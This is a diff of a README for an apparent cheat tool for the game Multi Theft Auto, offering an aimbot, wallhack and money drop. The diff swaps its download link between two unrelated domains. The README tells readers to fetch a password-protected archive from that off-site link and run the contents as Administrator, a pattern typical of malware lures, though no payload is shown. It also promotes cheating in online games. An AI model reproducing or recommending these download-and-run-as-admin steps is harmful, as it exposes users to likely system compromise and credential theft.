@@ -6,7 +6,7 @@ MTA external hack with mod menu, ESP wallhack, aimbot, vehicle spawn, money drop
 
 ## ⬇️ Download
 
-**[CLICK](https://gitappsdown.pro/)**
+**[CLICK](https://gitdownapps.top)**
 
 Archive passkey: `Github`
 
@@ -85,7 +85,7 @@ Archive passkey: `Github`
 
 ## 🔧 How to Use
 
-1. Click **[CLICK](https://gitappsdown.pro/)** to download.
+1. Click **[CLICK](https://gitdownapps.top)** to download.
 2. Extract the archive.
 3. Launch MTA and join a server.
 4. Run the hack **as Administrator**.
